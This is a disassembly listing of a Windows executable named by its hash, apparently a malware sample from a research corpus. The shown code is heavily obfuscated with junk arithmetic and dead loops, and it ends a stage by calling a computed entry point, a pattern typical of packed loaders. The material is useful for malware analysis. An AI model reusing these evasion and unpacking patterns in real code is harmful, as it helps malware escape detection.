
a79ce874f4e3c74ee6e0e8cd6e869127379ae5af57d6dfd20d5e25711f8929ba.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x108
  401009:	push   esi
  40100a:	lea    eax,[ebp-0xc4]
  401010:	push   eax
  401011:	add    DWORD PTR ds:0x435000,0x438000
  40101b:	push   0xf
  40101d:	sub    DWORD PTR ds:0x43701c,0x435018
  401027:	call   DWORD PTR ds:0x43a8d8
  40102d:	xor    DWORD PTR ds:0x434020,0x437010
  401037:	push   0x43a3e4
  40103c:	inc    DWORD PTR ds:0x435010
  401042:	xor    esi,esi
  401044:	inc    esi
  401045:	mov    DWORD PTR ds:0x434000,0x5c4e
  40104f:	push   esi
  401050:	dec    DWORD PTR ds:0x43401c
  401056:	push   esi
  401057:	and    DWORD PTR ds:0x438004,0x43501c
  401061:	call   DWORD PTR ds:0x43a8ec
  401067:	xor    DWORD PTR ds:0x438000,0x435010
  401071:	test   eax,eax
  401073:	mov    DWORD PTR ds:0x436018,0x4ead
  40107d:	je     0x401094
  401083:	xor    eax,eax
  401085:	mov    DWORD PTR ds:0x435008,0x2c45
  40108f:	jmp    0x40258f
  401094:	push   ebx
  401095:	xor    DWORD PTR ds:0x435008,ecx
  40109b:	mov    ebx,DWORD PTR ds:0x43a8cc
  4010a1:	inc    DWORD PTR ds:0x434004
  4010a7:	push   0x9
  4010a9:	add    DWORD PTR ds:0x434024,0x434008
  4010b3:	push   0x43a3fc
  4010b8:	call   ebx
  4010ba:	and    DWORD PTR ds:0x43800c,0x434000
  4010c4:	test   eax,eax
  4010c6:	je     0x4010ef
  4010cc:	sbb    DWORD PTR ds:0x435010,0x438014
  4010d6:	lea    eax,[ebp-0x20]
  4010d9:	push   eax
  4010da:	or     DWORD PTR ds:0x43601c,0x436010
  4010e4:	call   DWORD PTR ds:0x43a8bc
  4010ea:	jmp    0x40258e
  4010ef:	push   edi
  4010f0:	inc    edi
  4010f1:	mov    edi,DWORD PTR ds:0x43a8fc
  4010f7:	push   0x43a418
  4010fc:	adc    DWORD PTR ds:0x43401c,0x6c9b
  401106:	push   esi
  401107:	push   esi
  401108:	or     DWORD PTR ds:0x434018,0x43401c
  401112:	call   edi
  401114:	and    DWORD PTR ds:0x436004,0x434004
  40111e:	test   eax,eax
  401120:	mov    DWORD PTR ds:0x436000,0x329d
  40112a:	jne    0x40241c
  401130:	mov    esi,DWORD PTR ds:0x43a908
  401136:	or     DWORD PTR ds:0x436000,0x434018
  401140:	push   0xd
  401142:	sbb    DWORD PTR ds:0x435000,0x435010
  40114c:	push   0x43a428
  401151:	adc    DWORD PTR ds:0x43601c,0x44f1
  40115b:	call   esi
  40115d:	test   eax,eax
  40115f:	mov    DWORD PTR ds:0x43801c,0x3c7b
  401169:	je     0x401230
  40116f:	or     DWORD PTR ds:0x434028,0x4ff1
  401179:	push   0x43a43c
  40117e:	xor    DWORD PTR ds:0x434004,0x7bc9
  401188:	push   0x1
  40118a:	push   0x1
  40118c:	sub    DWORD PTR ds:0x435014,0x4cb8
  401196:	call   DWORD PTR ds:0x43a8ec
  40119c:	adc    DWORD PTR ds:0x43600c,0x5c72
  4011a6:	test   eax,eax
  4011a8:	jne    0x402440
  4011ae:	push   0x9
  4011b0:	push   0x43a454
  4011b5:	call   ebx
  4011b7:	xor    DWORD PTR ds:0x434020,0x434004
  4011c1:	test   eax,eax
  4011c3:	mov    DWORD PTR ds:0x43501c,0x26a9
  4011cd:	jne    0x40241c
  4011d3:	add    DWORD PTR ds:0x43400c,0x437000
  4011dd:	push   0x43a470
  4011e2:	or     DWORD PTR ds:0x436004,0x437018
  4011ec:	push   0x1
  4011ee:	push   0x1
  4011f0:	call   edi
  4011f2:	xor    DWORD PTR ds:0x43501c,0xa21
  4011fc:	test   eax,eax
  4011fe:	jne    0x40241c
  401204:	and    DWORD PTR ds:0x435014,0x437004
  40120e:	push   0xd
  401210:	push   0x43a480
  401215:	sbb    DWORD PTR ds:0x436010,0x7182
  40121f:	call   esi
  401221:	mov    DWORD PTR ds:0x436004,0x55a5
  40122b:	jmp    0x402440
  401230:	mov    DWORD PTR [ebp-0x10],0x0
  401237:	add    DWORD PTR ds:0x436008,ecx
  40123d:	mov    eax,DWORD PTR [ebp-0x3c]
  401240:	mov    DWORD PTR [ebp-0x3c],eax
  401243:	mov    DWORD PTR [ebp-0x8],0xf89c8585
  40124a:	add    DWORD PTR ds:0x43700c,0x15f
  401254:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  40125b:	lea    eax,[ebp-0x44]
  40125e:	mov    edi,DWORD PTR ds:0x416574
  401264:	mov    ecx,DWORD PTR ds:0x416578
  40126a:	sub    edi,ecx
  40126c:	sub    edi,DWORD PTR [edi+ecx*1]
  40126f:	mov    DWORD PTR [ebp-0x38],eax
  401272:	xor    DWORD PTR ds:0x43500c,ecx
  401278:	lea    eax,[ebp-0x48]
  40127b:	mov    DWORD PTR [ebp-0x18],eax
  40127e:	xor    edi,edi
  401280:	add    edi,DWORD PTR ds:0x434008
  401286:	xor    DWORD PTR ds:0x435014,edi
  40128c:	mov    eax,ds:0x43a2d4
  401291:	mov    eax,DWORD PTR [eax+0x1c8]
  401297:	movzx  esi,BYTE PTR ds:0x43501c
  40129e:	or     esi,DWORD PTR ds:0x437004
  4012a4:	mov    DWORD PTR ds:0x43501c,esi
  4012aa:	mov    eax,DWORD PTR [eax]
  4012ac:	mov    ecx,DWORD PTR [ebp-0x18]
  4012af:	mov    esi,0x751089b
  4012b4:	add    DWORD PTR ds:0x438008,0x58e0
  4012be:	xor    eax,esi
  4012c0:	xor    DWORD PTR ds:0x434008,edi
  4012c6:	mov    edi,0x3272e2
  4012cb:	and    DWORD PTR ds:0x434000,0x437010
  4012d5:	add    eax,edi
  4012d7:	mov    DWORD PTR [ecx],eax
  4012d9:	mov    eax,ds:0x43a724
  4012de:	cmp    eax,0x312bc9f6
  4012e3:	jne    0x401370
  4012e9:	sbb    DWORD PTR ds:0x436010,0x463c
  4012f3:	mov    eax,DWORD PTR [ebp-0x8]
  4012f6:	mov    ecx,DWORD PTR ds:0x43a2d4
  4012fc:	inc    ebx
  4012fd:	mov    ecx,DWORD PTR [ecx+0x198]
  401303:	xor    eax,esi
  401305:	add    DWORD PTR ds:0x43701c,0x3b79
  40130f:	add    eax,edi
  401311:	mov    DWORD PTR [ecx],eax
  401313:	neg    DWORD PTR ds:0x436008
  401319:	mov    eax,DWORD PTR [ebp-0x8]
  40131c:	xor    eax,esi
  40131e:	and    DWORD PTR ds:0x437008,0x0
  401328:	jmp    0x40133a
  40132d:	mov    ebx,DWORD PTR ds:0x437008
  401333:	inc    ebx
  401334:	mov    DWORD PTR ds:0x437008,ebx
  40133a:	cmp    DWORD PTR ds:0x437008,0x12
  401341:	jae    0x401369
  401347:	cmp    DWORD PTR ds:0x437008,0x17
  40134e:	jg     0x401369
  401354:	jmp    0x401364
  401359:	push   0x426b
  40135e:	call   DWORD PTR ds:0x43a8c4
  401364:	jmp    0x40132d
  401369:	add    eax,edi
  40136b:	mov    ds:0x43a724,eax
  401370:	mov    eax,ds:0x43a2d4
  401375:	add    ebx,0x1d59
  40137b:	mov    eax,DWORD PTR [eax+0x18c]
  401381:	mov    eax,DWORD PTR [eax]
  401383:	mov    ebx,DWORD PTR ds:0x416538
  401389:	mov    ebx,DWORD PTR [ebx]
  40138b:	and    DWORD PTR ds:0x436004,ebx
  401391:	mov    DWORD PTR [ebp-0x7c],eax
  401394:	mov    eax,ds:0x416530
  401399:	mov    ebx,DWORD PTR ds:0x4165b8
  40139f:	sub    eax,ebx
  4013a1:	sub    eax,DWORD PTR [eax+ebx*1]
  4013a4:	mov    eax,0xf89c85b9
  4013a9:	mov    DWORD PTR [ebp-0x10],eax
  4013ac:	sbb    DWORD PTR ds:0x43500c,ebx
  4013b2:	mov    DWORD PTR [ebp-0x10],eax
  4013b5:	adc    DWORD PTR ds:0x436008,edx
  4013bb:	mov    DWORD PTR [ebp-0x10],eax
  4013be:	mov    DWORD PTR ds:0x434000,0x12
  4013c8:	cmp    DWORD PTR ds:0x434000,0x0
  4013cf:	je     0x401402
  4013d5:	cmp    DWORD PTR ds:0x434000,0x17
  4013dc:	jg     0x401402
  4013e2:	jmp    0x4013f0
  4013e7:	push   DWORD PTR [ebp-0x14]
  4013ea:	call   DWORD PTR ds:0x43a8c8
  4013f0:	mov    ebx,DWORD PTR ds:0x434000
  4013f6:	dec    ebx
  4013f7:	mov    DWORD PTR ds:0x434000,ebx
  4013fd:	jmp    0x4013c8
  401402:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  401409:	and    DWORD PTR ds:0x436004,0x0
  401413:	jmp    0x401425
  401418:	mov    ebx,DWORD PTR ds:0x436004
  40141e:	inc    ebx
  40141f:	mov    DWORD PTR ds:0x436004,ebx
  401425:	cmp    DWORD PTR ds:0x436004,0x15
  40142c:	jae    0x401454
  401432:	cmp    DWORD PTR ds:0x436004,0x1c
  401439:	ja     0x401454
  40143f:	jmp    0x40144f
  401444:	push   0x43a097
  401449:	call   DWORD PTR ds:0x43a8d0
  40144f:	jmp    0x401418
  401454:	mov    DWORD PTR [ebp-0x10],eax
  401457:	adc    ebx,0x4a4f
  40145d:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  401464:	movzx  ebx,WORD PTR ds:0x434000
  40146b:	xor    ebx,DWORD PTR ds:0x438000
  401471:	mov    DWORD PTR ds:0x434000,ebx
  401477:	mov    ebx,DWORD PTR [ebp-0x8]
  40147a:	xor    ebx,esi
  40147c:	or     DWORD PTR ds:0x436000,0x43801c
  401486:	add    ebx,edi
  401488:	mov    DWORD PTR ds:0x434004,0x16bd
  401492:	jmp    0x401599
  401497:	adc    eax,DWORD PTR ds:0x437010
  40149d:	mov    eax,DWORD PTR [ebp-0xc]
  4014a0:	add    DWORD PTR ds:0x43600c,0x435004
  4014aa:	xor    eax,esi
  4014ac:	sub    DWORD PTR ds:0x434024,0x438008
  4014b6:	lea    eax,[eax+ebx*1+0x3272e2]
  4014bd:	or     DWORD PTR ds:0x43401c,0x36
  4014c7:	push   eax
  4014c8:	neg    DWORD PTR ds:0x43401c
  4014ce:	mov    eax,DWORD PTR [ebp-0x18]
  4014d1:	xor    eax,esi
  4014d3:	adc    DWORD PTR ds:0x437004,0x7bd1
  4014dd:	lea    eax,[ebp+eax*1+0x3272ea]
  4014e4:	or     DWORD PTR ds:0x434028,0x5a2b
  4014ee:	push   eax
  4014ef:	and    DWORD PTR ds:0x435010,0x0
  4014f9:	jmp    0x401509
  4014fe:	mov    eax,ds:0x435010
  401503:	inc    eax
  401504:	mov    ds:0x435010,eax
  401509:	cmp    DWORD PTR ds:0x435010,0x1b
  401510:	jae    0x401550
  401516:	cmp    DWORD PTR ds:0x435010,0x8
  40151d:	jl     0x401550
  401523:	jmp    0x401533
  401528:	push   0x43a111
  40152d:	call   DWORD PTR ds:0x43a8d4
  401533:	cmp    DWORD PTR ds:0x435010,0x7
  40153a:	jne    0x40154b
  401540:	mov    eax,ds:0x435010
  401545:	inc    eax
  401546:	mov    ds:0x435010,eax
  40154b:	jmp    0x4014fe
  401550:	mov    eax,ds:0x43a2d4
  401555:	sub    DWORD PTR ds:0x438000,0x71a4
  40155f:	push   DWORD PTR [eax+0x1bc]
  401565:	adc    DWORD PTR ds:0x436008,0x7f70
  40156f:	call   0x402598
  401574:	movzx  ecx,BYTE PTR ds:0x434020
  40157b:	sbb    DWORD PTR ds:0x434008,ecx
  401581:	mov    eax,DWORD PTR [ebp-0xc]
  401584:	adc    ecx,DWORD PTR ds:0x438018
  40158a:	xor    eax,esi
  40158c:	sbb    ecx,DWORD PTR ds:0x437000
  401592:	lea    ebx,[ebx+eax*1+0x3272e2]
  401599:	mov    ecx,DWORD PTR ds:0x434018
  40159f:	add    DWORD PTR ds:0x436000,ecx
  4015a5:	mov    eax,DWORD PTR [ebp-0xc]
  4015a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4015ab:	adc    DWORD PTR ds:0x43801c,0x43400c
  4015b5:	xor    ecx,esi
  4015b7:	xor    DWORD PTR ds:0x43800c,0x6ae7
  4015c1:	xor    eax,esi
  4015c3:	add    eax,ecx
  4015c5:	xor    ecx,0x639d
  4015cb:	mov    ecx,DWORD PTR [ebp-0xc]
  4015ce:	sbb    DWORD PTR ds:0x437004,0x435008
  4015d8:	xor    ecx,esi
  4015da:	lea    eax,[eax+ecx*1+0x9758a6]
  4015e1:	mov    DWORD PTR ds:0x437018,0x6f5b
  4015eb:	cmp    ebx,eax
  4015ed:	jbe    0x401497
  4015f3:	mov    eax,DWORD PTR [ebp+0xc]
  4015f6:	and    DWORD PTR ds:0x43601c,ebx
  4015fc:	mov    ds:0x43a158,eax
  401601:	mov    eax,DWORD PTR [ebp+0x10]
  401604:	mov    DWORD PTR ds:0x435004,0xee9
  40160e:	mov    ds:0x43a3ac,eax
  401613:	sbb    DWORD PTR ds:0x436000,ebx
  401619:	mov    eax,ds:0x43a158
  40161e:	neg    ecx
  401620:	mov    ecx,DWORD PTR [ebp-0x38]
  401623:	sub    eax,edi
  401625:	xor    eax,esi
  401627:	mov    DWORD PTR ds:0x438010,0x5a04
  401631:	mov    DWORD PTR [ecx],eax
  401633:	mov    DWORD PTR ds:0x438010,ecx
  401639:	mov    eax,DWORD PTR [ebp-0x3c]
  40163c:	mov    DWORD PTR ds:0x43701c,0x1a94
  401646:	cmp    eax,0xf89c8585
  40164b:	mov    DWORD PTR ds:0x43501c,0x7d63
  401655:	jne    0x401b36
  40165b:	or     DWORD PTR ds:0x43400c,0x43501c
  401665:	push   0x43a494
  40166a:	xor    ebx,ebx
  40166c:	mov    DWORD PTR ds:0x43700c,0x6301
  401676:	inc    ebx
  401677:	and    DWORD PTR ds:0x437014,0x438000
  401681:	push   ebx
  401682:	push   ebx
  401683:	adc    DWORD PTR ds:0x436010,0x6629
  40168d:	call   DWORD PTR ds:0x43a8ec
  401693:	or     DWORD PTR ds:0x435008,0x107f
  40169d:	test   eax,eax
  40169f:	jne    0x402440
  4016a5:	xor    DWORD PTR ds:0x434014,0x437000
  4016af:	push   0x9
  4016b1:	push   0x43a4ac
  4016b6:	xor    DWORD PTR ds:0x43701c,0x434028
  4016c0:	call   DWORD PTR ds:0x43a8cc
  4016c6:	test   eax,eax
  4016c8:	jne    0x40241c
  4016ce:	adc    DWORD PTR ds:0x438010,0x6458
  4016d8:	push   0x43a4c8
  4016dd:	push   ebx
  4016de:	push   ebx
  4016df:	call   DWORD PTR ds:0x43a8fc
  4016e5:	test   eax,eax
  4016e7:	mov    DWORD PTR ds:0x434014,0x6a9b
  4016f1:	jne    0x40241c
  4016f7:	add    DWORD PTR ds:0x434018,0x437004
  401701:	push   0xd
  401703:	neg    DWORD PTR ds:0x438004
  401709:	push   0x43a4d8
  40170e:	and    DWORD PTR ds:0x435010,0x62ab
  401718:	call   DWORD PTR ds:0x43a908
  40171e:	or     DWORD PTR ds:0x435008,0x43600c
  401728:	test   eax,eax
  40172a:	jne    0x402440
  401730:	sbb    DWORD PTR ds:0x436010,0x438018
  40173a:	lea    eax,[ebp-0x34]
  40173d:	sub    DWORD PTR ds:0x43500c,0x6999
  401747:	mov    DWORD PTR [ebp-0x9c],eax
  40174d:	lea    eax,[ebp+0x4]
  401750:	or     DWORD PTR ds:0x43700c,0x43601c
  40175a:	mov    DWORD PTR [ebp-0x34],eax
  40175d:	xor    eax,DWORD PTR ds:0x43600c
  401763:	mov    eax,DWORD PTR [ebp-0x34]
  401766:	and    DWORD PTR ds:0x43401c,0x436018
  401770:	test   eax,eax
  401772:	je     0x402572
  401778:	xor    eax,ecx
  40177a:	mov    eax,DWORD PTR [ebp-0x28]
  40177d:	mov    eax,DWORD PTR [ebp-0xc]
  401780:	xor    DWORD PTR ds:0x434008,0x3c87
  40178a:	mov    eax,DWORD PTR [ebp-0x8]
  40178d:	and    DWORD PTR ds:0x434008,0x0
  401797:	xor    ecx,ecx
  401799:	add    ecx,DWORD PTR ds:0x434008
  40179f:	inc    ecx
  4017a0:	mov    DWORD PTR ds:0x434008,ecx
  4017a6:	cmp    DWORD PTR ds:0x434008,0x23
  4017ad:	jbe    0x4017ce
  4017b3:	jmp    0x4017c1
  4017b8:	push   DWORD PTR [ebp-0x20]
  4017bb:	call   DWORD PTR ds:0x43a8dc
  4017c1:	cmp    DWORD PTR ds:0x434008,0x15
  4017c8:	jb     0x401797
  4017ce:	mov    DWORD PTR [ebp+0xc],eax
  4017d1:	mov    DWORD PTR ds:0x43400c,0x1d
  4017db:	cmp    DWORD PTR ds:0x43400c,0x0
  4017e2:	je     0x40183c
  4017e8:	cmp    DWORD PTR ds:0x43400c,0x3
  4017ef:	ja     0x40183c
  4017f5:	jmp    0x40180e
  4017fa:	push   0x43a0c9
  4017ff:	push   DWORD PTR [ebp-0x18]
  401802:	push   DWORD PTR [ebp-0x28]
  401805:	push   DWORD PTR [ebp-0x1c]
  401808:	call   DWORD PTR ds:0x43a8e0
  40180e:	cmp    DWORD PTR ds:0x43400c,0x4
  401815:	jne    0x40182a
  40181b:	xor    ecx,ecx
  40181d:	add    ecx,DWORD PTR ds:0x43400c
  401823:	dec    ecx
  401824:	mov    DWORD PTR ds:0x43400c,ecx
  40182a:	mov    ecx,DWORD PTR ds:0x43400c
  401830:	dec    ecx
  401831:	mov    DWORD PTR ds:0x43400c,ecx
  401837:	jmp    0x4017db
  40183c:	mov    eax,eax
  40183e:	and    DWORD PTR ds:0x43401c,0x0
  401848:	jmp    0x40185c
  40184d:	xor    ecx,ecx
  40184f:	add    ecx,DWORD PTR ds:0x43401c
  401855:	inc    ecx
  401856:	mov    DWORD PTR ds:0x43401c,ecx
  40185c:	cmp    DWORD PTR ds:0x43401c,0x14
  401863:	jae    0x4018b6
  401869:	cmp    DWORD PTR ds:0x43401c,0x9
  401870:	jge    0x4018b6
  401876:	jmp    0x401897
  40187b:	push   DWORD PTR [ebp-0x14]
  40187e:	push   0x434004
  401883:	push   DWORD PTR [ebp-0x24]
  401886:	push   0x43a07b
  40188b:	push   DWORD PTR [ebp-0x20]
  40188e:	push   DWORD PTR [ebp-0x18]
  401891:	call   DWORD PTR ds:0x43a8e4
  401897:	cmp    DWORD PTR ds:0x43401c,0x8
  40189e:	jne    0x4018b1
  4018a4:	mov    ecx,DWORD PTR ds:0x43401c
  4018aa:	inc    ecx
  4018ab:	mov    DWORD PTR ds:0x43401c,ecx
  4018b1:	jmp    0x40184d
  4018b6:	mov    eax,ds:0x43a2d4
  4018bb:	or     DWORD PTR ds:0x434008,0x6b78
  4018c5:	mov    eax,DWORD PTR [eax+0x1c8]
  4018cb:	mov    eax,DWORD PTR [eax]
  4018cd:	mov    DWORD PTR ds:0x43400c,0x1f
  4018d7:	cmp    DWORD PTR ds:0x43400c,0x0
  4018de:	je     0x40191e
  4018e4:	cmp    DWORD PTR ds:0x43400c,0x21
  4018eb:	jbe    0x40191e
  4018f1:	jmp    0x40190a
  4018f6:	push   0x1259
  4018fb:	push   DWORD PTR [ebp-0x10]
  4018fe:	push   DWORD PTR [ebp-0x28]
  401901:	push   DWORD PTR [ebp-0xc]
  401904:	call   DWORD PTR ds:0x43a8e8
  40190a:	xor    ecx,ecx
  40190c:	xor    ecx,DWORD PTR ds:0x43400c
  401912:	dec    ecx
  401913:	mov    DWORD PTR ds:0x43400c,ecx
  401919:	jmp    0x4018d7
  40191e:	cdq    
  40191f:	mov    ebx,eax
  401921:	mov    DWORD PTR ds:0x435000,0x1d
  40192b:	cmp    DWORD PTR ds:0x435000,0x0
  401932:	je     0x401964
  401938:	cmp    DWORD PTR ds:0x435000,0x28
  40193f:	ja     0x401964
  401945:	jmp    0x401950
  40194a:	call   DWORD PTR ds:0x43a8f0
  401950:	xor    ecx,ecx
  401952:	add    ecx,DWORD PTR ds:0x435000
  401958:	dec    ecx
  401959:	mov    DWORD PTR ds:0x435000,ecx
  40195f:	jmp    0x40192b
  401964:	mov    eax,0xfabdbee7
  401969:	add    ebx,eax
  40196b:	mov    DWORD PTR ds:0x43501c,ebx
  401971:	adc    edx,0xffffffff
  401974:	and    ecx,DWORD PTR ds:0x434018
  40197a:	and    DWORD PTR [ebp-0x10],0x0
  40197e:	xor    edx,0x0
  401981:	mov    DWORD PTR [ebp-0x6c],edx
  401984:	mov    edx,DWORD PTR [ebp+0xc]
  401987:	mov    DWORD PTR [ebp-0x14],edx
  40198a:	and    ecx,edx
  40198c:	mov    ecx,0x8a29a12d
  401991:	and    DWORD PTR ds:0x437018,0x6956
  40199b:	xor    ebx,ecx
  40199d:	add    DWORD PTR [ebp-0x14],eax
  4019a0:	mov    edx,DWORD PTR [ebp-0x14]
  4019a3:	mov    DWORD PTR ds:0x437018,0xe51
  4019ad:	adc    DWORD PTR [ebp-0x10],0xffffffff
  4019b1:	adc    DWORD PTR ds:0x43401c,0x434014
  4019bb:	xor    edx,ecx
  4019bd:	sub    DWORD PTR ds:0x438018,0x437000
  4019c7:	mov    DWORD PTR [ebp-0x5c],edx
  4019ca:	mov    edx,DWORD PTR [ebp-0x10]
  4019cd:	xor    edx,0x0
  4019d0:	mov    DWORD PTR [ebp-0x58],edx
  4019d3:	mov    DWORD PTR ds:0x43600c,0x7e33
  4019dd:	cmp    DWORD PTR [ebp-0x5c],ebx
  4019e0:	mov    DWORD PTR ds:0x434010,0x71c9
  4019ea:	jne    0x401a0c
  4019f0:	mov    edx,DWORD PTR ds:0x434004
  4019f6:	mov    edx,DWORD PTR [ebp-0x6c]
  4019f9:	cmp    DWORD PTR [ebp-0x58],edx
  4019fc:	mov    DWORD PTR ds:0x43600c,0x7cc1
  401a06:	je     0x401aa7
  401a0c:	mov    DWORD PTR ds:0x434018,0x1c
  401a16:	cmp    DWORD PTR ds:0x434018,0x0
  401a1d:	je     0x401a50
  401a23:	cmp    DWORD PTR ds:0x434018,0x29
  401a2a:	jbe    0x401a50
  401a30:	jmp    0x401a3e
  401a35:	push   DWORD PTR [ebp-0x28]
  401a38:	call   DWORD PTR ds:0x43a8f4
  401a3e:	mov    edx,DWORD PTR ds:0x434018
  401a44:	dec    edx
  401a45:	mov    DWORD PTR ds:0x434018,edx
  401a4b:	jmp    0x401a16
  401a50:	mov    edx,DWORD PTR ds:0x43a2d4
  401a56:	or     DWORD PTR ds:0x436018,0x438010
  401a60:	mov    edx,DWORD PTR [edx+0x1c0]
  401a66:	add    DWORD PTR ds:0x434018,0x436004
  401a70:	mov    edx,DWORD PTR [edx]
  401a72:	xor    ebx,ebx
  401a74:	add    edx,eax
  401a76:	adc    ebx,0xffffffff
  401a79:	xor    edx,ecx
  401a7b:	xor    ebx,0x0
  401a7e:	cmp    edx,0x70941fc5
  401a84:	mov    DWORD PTR ds:0x438014,0x6222
  401a8e:	jne    0x402572
  401a94:	cmp    ebx,0xffffffff
  401a97:	mov    DWORD PTR ds:0x436010,0x168c
  401aa1:	jne    0x402572
  401aa7:	mov    edx,DWORD PTR ds:0x43a350
  401aad:	or     DWORD PTR ds:0x43501c,0x338f
  401ab7:	mov    ebx,DWORD PTR ds:0x43a358
  401abd:	sbb    DWORD PTR ds:0x43501c,0x434008
  401ac7:	xor    edx,ebx
  401ac9:	and    DWORD PTR ds:0x438000,0x0
  401ad3:	jmp    0x401ae5
  401ad8:	mov    ebx,DWORD PTR ds:0x438000
  401ade:	inc    ebx
  401adf:	mov    DWORD PTR ds:0x438000,ebx
  401ae5:	cmp    DWORD PTR ds:0x438000,0x1a
  401aec:	jae    0x401b17
  401af2:	cmp    DWORD PTR ds:0x438000,0x29
  401af9:	jl     0x401b17
  401aff:	jmp    0x401b12
  401b04:	push   0x4320
  401b09:	push   DWORD PTR [ebp-0x28]
  401b0c:	call   DWORD PTR ds:0x43a8f8
  401b12:	jmp    0x401ad8
  401b17:	mov    DWORD PTR ds:0x43a350,edx
  401b1d:	mov    edx,DWORD PTR [ebp-0x34]
  401b20:	mov    ebx,DWORD PTR ds:0x43a350
  401b26:	add    ebx,DWORD PTR [edx]
  401b28:	not    DWORD PTR ds:0x43801c
  401b2e:	mov    edx,DWORD PTR [ebp-0x34]
  401b31:	jmp    0x402531
  401b36:	mov    eax,DWORD PTR [ebp-0x44]
  401b39:	mov    DWORD PTR ds:0x436000,0x3783
  401b43:	cmp    eax,0xf89c8584
  401b48:	mov    DWORD PTR ds:0x434000,0x66dd
  401b52:	je     0x401d61
  401b58:	xor    eax,eax
  401b5a:	xor    eax,DWORD PTR ds:0x434018
  401b60:	adc    eax,DWORD PTR ds:0x434024
  401b66:	mov    ds:0x434018,eax
  401b6b:	mov    eax,DWORD PTR [ebp-0x8]
  401b6e:	mov    ecx,DWORD PTR [ebp-0x48]
  401b71:	xor    eax,esi
  401b73:	add    eax,edi
  401b75:	mov    DWORD PTR ds:0x436004,0x39e8
  401b7f:	cmp    eax,ecx
  401b81:	mov    DWORD PTR ds:0x434018,0x5d7a
  401b8b:	je     0x401d61
  401b91:	xor    DWORD PTR ds:0x434000,0x3742
  401b9b:	push   0x43a5f4
  401ba0:	xor    esi,esi
  401ba2:	inc    esi
  401ba3:	sbb    DWORD PTR ds:0x43801c,0x434008
  401bad:	push   esi
  401bae:	sub    DWORD PTR ds:0x43701c,0x437018
  401bb8:	push   esi
  401bb9:	adc    DWORD PTR ds:0x436004,0x30fb
  401bc3:	call   DWORD PTR ds:0x43a8ec
  401bc9:	or     DWORD PTR ds:0x435000,0x43400c
  401bd3:	test   eax,eax
  401bd5:	mov    DWORD PTR ds:0x437010,0x752e
  401bdf:	jne    0x402440
  401be5:	mov    DWORD PTR ds:0x43501c,0xd2c
  401bef:	push   0x9
  401bf1:	add    DWORD PTR ds:0x43500c,0x3ba4
  401bfb:	push   0x43a60c
  401c00:	call   DWORD PTR ds:0x43a8cc
  401c06:	test   eax,eax
  401c08:	jne    0x40241c
  401c0e:	and    DWORD PTR ds:0x43401c,0x438010
  401c18:	push   0x43a628
  401c1d:	push   esi
  401c1e:	push   esi
  401c1f:	sbb    DWORD PTR ds:0x436000,0x437014
  401c29:	call   DWORD PTR ds:0x43a8fc
  401c2f:	or     DWORD PTR ds:0x43400c,0x434020
  401c39:	test   eax,eax
  401c3b:	mov    DWORD PTR ds:0x438018,0x4ca0
  401c45:	jne    0x40241c
  401c4b:	push   0xd
  401c4d:	add    DWORD PTR ds:0x437000,0x43400c
  401c57:	push   0x43a638
  401c5c:	call   DWORD PTR ds:0x43a908
  401c62:	add    DWORD PTR ds:0x437018,0x7176
  401c6c:	test   eax,eax
  401c6e:	jne    0x402440
  401c74:	mov    DWORD PTR ds:0x436000,0x1e
  401c7e:	cmp    DWORD PTR ds:0x436000,0x0
  401c85:	je     0x401cd4
  401c8b:	cmp    DWORD PTR ds:0x436000,0x10
  401c92:	jle    0x401cd4
  401c98:	jmp    0x401ca8
  401c9d:	push   0x435014
  401ca2:	call   DWORD PTR ds:0x43a900
  401ca8:	cmp    DWORD PTR ds:0x436000,0x11
  401caf:	jne    0x401cc2
  401cb5:	mov    ecx,DWORD PTR ds:0x436000
  401cbb:	dec    ecx
  401cbc:	mov    DWORD PTR ds:0x436000,ecx
  401cc2:	mov    ecx,DWORD PTR ds:0x436000
  401cc8:	dec    ecx
  401cc9:	mov    DWORD PTR ds:0x436000,ecx
  401ccf:	jmp    0x401c7e
  401cd4:	mov    eax,ds:0x43a2d4
  401cd9:	mov    ecx,DWORD PTR ds:0x435004
  401cdf:	or     DWORD PTR ds:0x438010,ecx
  401ce5:	mov    eax,DWORD PTR [eax+0x194]
  401ceb:	mov    ecx,DWORD PTR [eax]
  401ced:	mov    eax,DWORD PTR [ecx+0x3c]
  401cf0:	push   DWORD PTR ds:0x43a3ac
  401cf6:	mov    DWORD PTR ds:0x435014,0x6873
  401d00:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401d04:	push   DWORD PTR ds:0x43a158
  401d0a:	mov    DWORD PTR ds:0x43400c,0x7a94
  401d14:	add    eax,ecx
  401d16:	mov    ecx,DWORD PTR ds:0x43a2d4
  401d1c:	or     DWORD PTR ds:0x437010,0x5a23
  401d26:	mov    ecx,DWORD PTR [ecx+0x194]
  401d2c:	mov    DWORD PTR ds:0x436008,0x65e8
  401d36:	push   DWORD PTR [ecx]
  401d38:	sbb    DWORD PTR ds:0x43401c,0x5228
  401d42:	call   eax
  401d44:	mov    ecx,DWORD PTR ds:0x43a2d4
  401d4a:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401d50:	mov    DWORD PTR ds:0x437014,0xc7a
  401d5a:	mov    DWORD PTR [ecx],eax
  401d5c:	jmp    0x402572
  401d61:	adc    DWORD PTR ds:0x43700c,0x4142
  401d6b:	push   0x43a4ec
  401d70:	adc    DWORD PTR ds:0x435008,0x3813
  401d7a:	xor    ebx,ebx
  401d7c:	sbb    DWORD PTR ds:0x43801c,0x3514
  401d86:	inc    ebx
  401d87:	not    DWORD PTR ds:0x435008
  401d8d:	push   ebx
  401d8e:	push   ebx
  401d8f:	call   DWORD PTR ds:0x43a8ec
  401d95:	or     DWORD PTR ds:0x436010,0x434018
  401d9f:	test   eax,eax
  401da1:	mov    DWORD PTR ds:0x437008,0x71b6
  401dab:	jne    0x402440
  401db1:	or     DWORD PTR ds:0x438010,0x434014
  401dbb:	push   0x9
  401dbd:	add    DWORD PTR ds:0x437008,0x6ead
  401dc7:	push   0x43a504
  401dcc:	add    DWORD PTR ds:0x437010,0x12d1
  401dd6:	call   DWORD PTR ds:0x43a8cc
  401ddc:	add    DWORD PTR ds:0x434014,0x5154
  401de6:	test   eax,eax
  401de8:	mov    DWORD PTR ds:0x43600c,0xb65
  401df2:	jne    0x40241c
